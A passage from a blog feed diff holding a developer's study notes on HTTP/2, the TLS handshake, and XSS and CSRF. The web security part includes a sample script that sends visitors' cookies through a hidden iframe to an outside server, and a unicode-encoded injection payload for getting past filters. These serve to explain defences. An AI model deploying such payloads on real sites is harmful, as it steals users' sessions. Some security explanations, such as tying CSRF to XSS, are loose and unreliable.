+<p>The client can also specify the priority of the data stream, the higher the priority the sooner the server will respond to it.</p>
+<h4 id="header-compression"><a href="#header-compression" class="headerlink" title="header compression"></a>header compression</h4><p>As many fields in the <strong>request headers are repeated in each request</strong> (e.g. Cookie, User Agent, etc.), this can result in a lot of wasted bandwidth. HTTP/2 optimises this by introducing <strong>header compression</strong>. On the one hand, headers <strong>are compressed using methods such as <code>gzip</code></strong> before being sent; on the other hand, the client and server maintain a <strong>header table</strong> which is a mapping of <strong>fields and index numbers</strong>, after which only the index numbers are sent to improve speed.</p>
+<h4 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h4><p>HTTP/2 allows the server to send resources to the client unsolicited without receiving a request.</p>
+<p>For example, if a client requests a web page containing many static resources, the server will actively send these static resources to the client along with the web page, so that there is no need to wait for the client to receive the web page and parse the HTML to find static resources before requesting static resources.</p>
+<h2 id="HTTPS-Extra"><a href="#HTTPS-Extra" class="headerlink" title="HTTPS - Extra"></a>HTTPS - Extra</h2><p>The security of Internet communications is built on the <strong>SSL/TLS</strong> protocol.</p>
+<p><strong>Note</strong>: SSL - <strong>Secure Sockets Layer</strong>, TLS - an upgrade from SSL</p>
+<h3 id="Reasons-for-using-HTTPS-amp-what-it-does"><a href="#Reasons-for-using-HTTPS-amp-what-it-does" class="headerlink" title="Reasons for using HTTPS &amp; what it does"></a>Reasons for using HTTPS &amp; what it does</h3><p><strong>Comparison:</strong></p>
+<ul>
+<li><p>HTTP does not use SSL/TLS and is therefore unencrypted communication, all information is transmitted in clear text</p>
+<ol>
+<li><strong>Eavesdropping risk:</strong> third parties can intercept and be informed of the content of communications</li>
+<li><strong>tampering:</strong> third parties can intercept and modify the content of communications</li>
+<li><strong>pretending:</strong> a third party can impersonate another person to participate in the communication</li>
+</ol>
+</li>
+<li><p>Benefits of HTTPS based on SSL/TLS protocol</p>
+<ol>
+<li><strong>All messages are transmitted encrypted</strong> - no eavesdropping</li>
+<li><strong>with a checksum mechanism</strong> - any tampering with the content of the communication can be detected by both parties to the communication</li>
+<li><strong>Equipped with a certificate of identity</strong> - prevents identity impersonation</li>
+</ol>
+</li>
+</ul>
+<h3 id="The-basic-operation-of-the-SSL-TLS-protocol"><a href="#The-basic-operation-of-the-SSL-TLS-protocol" class="headerlink" title="The basic operation of the SSL/TLS protocol"></a>The basic operation of the SSL/TLS protocol</h3><p>The basic idea of the protocol is:** asymmetric encryption: public key encryption, private key decryption**. That is, the client first asks the server for the public key, then encrypts the message with the public key, and the server receives the ciphertext and decrypts it with its own private key.</p>
+<ol>
+<li><p><strong>How to ensure that the public key cannot be tampered with?</strong></p>
+<p>Answer: <strong>Put the public key into the digital certificate</strong>, as long as the certificate is trusted, then the public key is trusted.</p>
+</li>
+<li><p><strong>How to reduce the time required for encryption with a public key that is too computationally intensive?</strong></p>
+<p>Answer: For each conversation (session), the client and the server will generate a “conversation key” (session key), which will be used to encrypt the message. As the session key is a symmetric encryption, it is very fast, so if the server public key is only used to encrypt the session key itself, the time consumed for encryption is greatly reduced.</p>
+</li>
+</ol>
+<p>So, the basic process of the SSL/TLS protocol is</p>
+<ol>
+<li>the client requests and verifies the public key <strong>from the server</strong> - the handshake phase</li>
+<li>both parties negotiate <strong>to generate a “conversation key “</strong></li>
+<li>both parties use the “conversation key “ <strong>for encrypted communication</strong></li>
+</ol>
+<h3 id="Handshake-phase"><a href="#Handshake-phase" class="headerlink" title="Handshake phase"></a>Handshake phase</h3><p>The handshake phase involves four communications and all communications during this phase are in plaintext.</p>
+<h4 id="Phase-1-The-client-sends-a-request"><a href="#Phase-1-The-client-sends-a-request" class="headerlink" title="Phase 1: The client sends a request"></a>Phase 1: The client sends a request</h4><p>First, the client sends an encrypted communication request to the server. The request it sends is mainly about the following.</p>
+<ol>
+<li>the supported protocol version, e.g. TLS 1.0</li>
+<li>a random number generated by the client to be used later to generate a “conversation key”</li>
+<li>the encryption method supported, e.g. RSA public key encryption</li>
+<li>supported compression methods</li>
+</ol>
+<h4 id="Phase-2-Server-Response"><a href="#Phase-2-Server-Response" class="headerlink" title="Phase 2: Server Response"></a>Phase 2: Server Response</h4><p>The server receives a request from the client and sends a response to the client. The response mainly includes the following.</p>
+<ol>
+<li>confirmation of the version of the encrypted communication protocol used. If the two sides do not support the same version, the server will close this encrypted communication</li>
+<li>a random number generated by the server to be used later to generate the “conversation key”</li>
+<li>confirmation of the encryption method used</li>
+<li>the server certificate</li>
+</ol>
+<h4 id="Phase-3-Client-Response"><a href="#Phase-3-Client-Response" class="headerlink" title="Phase 3: Client Response"></a>Phase 3: Client Response</h4><p>When the client receives the response from the server, it first verifies the server’s digital certificate.</p>
+<p>If <strong>1. the certificate is not credible. 2. the domain name in the certificate does not match the actual domain name. 3. the certificate has expired</strong>, a warning is displayed to the visitor, giving him/her the option to continue the communication or not.</p>
+<p>If there is no problem with the certificate, the client will <strong>take the server’s public key</strong> from the certificate and send a response to the server with the following main contents.</p>
+<ol>
+<li>A random number generated by the client. The random number is encrypted with the public key to prevent eavesdropping.</li>
+<li>A notification of the change in encoding. Indicates that subsequent messages will be sent using the mutually agreed encryption method and key.</li>
+<li>client end of handshake notification. Indicates the end of the client’s handshake phase, this item is also the hash value of all content sent earlier and is used for server verification.</li>
+</ol>
+<p><strong>Note:</strong> The random number generated in this phase is the third random number (“pre-master key”) that appears throughout the handshake phase. With this, both the client and the server have three random numbers at the same time, and then each side generates the same “session key” for the session, using a pre-agreed encryption method.</p>
+<h4 id="Phase-4-Final-server-response"><a href="#Phase-4-Final-server-response" class="headerlink" title="Phase 4: Final server response"></a>Phase 4: Final server response</h4><p>Once the server has received the third random number, it calculates and generates the “session key” for the current session. A final response is then sent to the client. The main contents are as follows.</p>
+<ol>
+<li>Notification of code change. This indicates that the subsequent message will be sent with the agreed encryption method and key. 2.</li>
+<li>End of server handshake notification. Indicates that the handshake phase of the server has ended. This item is also the hash value of all the content sent earlier and is used for verification by the client.</li>
+</ol>
+<p>At this point, the entire handshake phase is complete. Next, the client and server communicate encrypted, which is <strong>exactly the same as the normal HTTP protocol</strong>, <strong>except that all sent content is encrypted using the “session key”</strong>.</p>
+<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h3><h4 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h4><p>XSS, known as <strong>Cross-site scripting</strong>, or cross-site scripting in Chinese, is a type of <strong>attack</strong> on the security vulnerability of web applications, i.e. a type of <strong>code injection</strong>. This type of attack usually involves both HTML and user scripting languages (mainly JavaScript).</p>
+<p>For example, posting a malicious piece of JavaScript code on a web forum in JavaScript is a script injection, while at the same time if the content of this code has the ability to request an external server, then it is called XSS.</p>
+<p>Therefore, it can be understood as <strong>XSS (cross-site scripting) = script injection + the ability to request an external server</strong>.</p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>For example, the following code is written for posting content in a forum site.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  while (true) &#123;</span><br><span class="line">    alert(&#x27;keep popping up windows&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Assuming the forum site has no filtering or other defence mechanisms, any user visiting this thread will have this pop-up popping up all the time in the client interface.</p>
+<p>**This is script injection in its simplest form. **Of course this script is not substantially more harmful then XSS is based on a script injection method to accomplish this, but it is injecting a script that contains a request for cross-site functionality.</p>
+<p>For example, in the forum site mentioned above, the following code is injected.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  (function(window, document) &#123;</span><br><span class="line">    // Construct the URL for the leaked information</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // Create a hidden iframe for communication</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // start</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This code will pass the cookie of any user who visits the post to a server with the name <code>http://192.168.123.123/myxss/</code>, which can then take this cookie and visit the corresponding website and log into the user’s account, which can then perform other operations.</p>
+<p>Therefore, the above code is XSS.</p>
+<h3 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF - Cross Site Request Forgery"></a>CSRF - Cross Site Request Forgery</h3><h4 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h4><p>CSRF, known as <strong>Cross-site request forgery</strong>, is a form of cross-site request forgery. It is an attack method that allows a user to perform some unintended actions** (such as name change, post deletion, emailing, etc.) on a currently logged-in web application.</p>
+<h4 id="Attack-Principle"><a href="#Attack-Principle" class="headerlink" title="Attack Principle"></a>Attack Principle</h4><p>Generally speaking, CSRF is implemented by XSS, on top of cross-site scripting, to implement forged requests, causing the victim to perform actions that he or she would not have intended to perform.</p>
+<p>**Note: CSRF can also be implemented without XSS. **</p>
+<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>After the external server has successfully obtained the user’s cookie, it can use the cookie to forge a series of requests to the forum website, such as changing the user’s name, changing the user’s password, etc. At this point, the attack can be called a CSRF.</p>
+<h3 id="Protection-against-XSS-and-CSRF-⭐️"><a href="#Protection-against-XSS-and-CSRF-⭐️" class="headerlink" title="Protection against XSS and CSRF ⭐️"></a>Protection against XSS and CSRF ⭐️</h3><p><em><strong>Core idea: don’t trust any external source data!!!</strong></em></p>
+<p>Generally speaking, most CSRF is based on XSS, so it can be said that by defending against XSS, you are basically defending against CSRF as well.</p>
+<p>For the prevention of XSS, there are two main methods as follows.</p>
+<ol>
+<li><strong>Input filtering: thorough sensitive character filtering of external input</strong> - front end + back end</li>
+<li><strong>Output filtering: when displayed on the page, do some processing so that sensitive code scripts cannot be executed smoothly</strong> - front-end</li>
+</ol>
+<p>Theoretically, wherever there is input data, there is an XSS vulnerability. JavaScript scripts can be injected into the database in various forms (e.g. plaintext, encoded, etc.).</p>
+<p>As mentioned above JS can be injected in a variety of illegal forms, the main illegal forms are of two types.</p>
+<ol>
+<li><p><strong>Plaintext:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js malicious code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>To handle the filtering of plaintext injections.</p>
+</li>
+<li><p><strong>Coding:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
+<p>The above encoding is unicode, which bypasses the <code>htmlSpecialChars</code> filter and is imported into the library, and then when the message is displayed, the html automatically converts the unicode encoding into plaintext, i.e. a real executable script.</p>
+<p>Since not only unicode can be injected, but other types of encoding as well (for similar reasons), we need to try to set the character encoding of the page to one (e.g. unicode: utf-8) so that we can focus on unicode injection.</p>
+</li>
+</ol>
+<h4 id="Some-other-general-prevention-methods"><a href="#Some-other-general-prevention-methods" class="headerlink" title="Some other general prevention methods"></a>Some other general prevention methods</h4><ol>
+<li><p>add the <code>Http Header</code> of the <code>Content Security Policy</code> to the output html</p>
+<p>What it does: Prevents the page from being embedded in a third-party script file when attacked by XSS</p>
+</li>
+<li><p>add <code>HttpOnly</code> parameter when setting cookies</p>
+<p>Function: To prevent cookie information from being stolen when the page is attacked by XSS</p>
+<p>Disadvantage: the website’s own <code>JavaScript</code> code cannot manipulate cookies</p>
+</li>
+<li><p>check the Referer parameter of the request when developing the API</p>
+<p>Effect: It can prevent CSRF attacks to a certain extent</p>
+</li>
+</ol>
+]]></content>
   </entry>
   <entry>
     <title>JavaScript琐碎基础---学习手记</title>
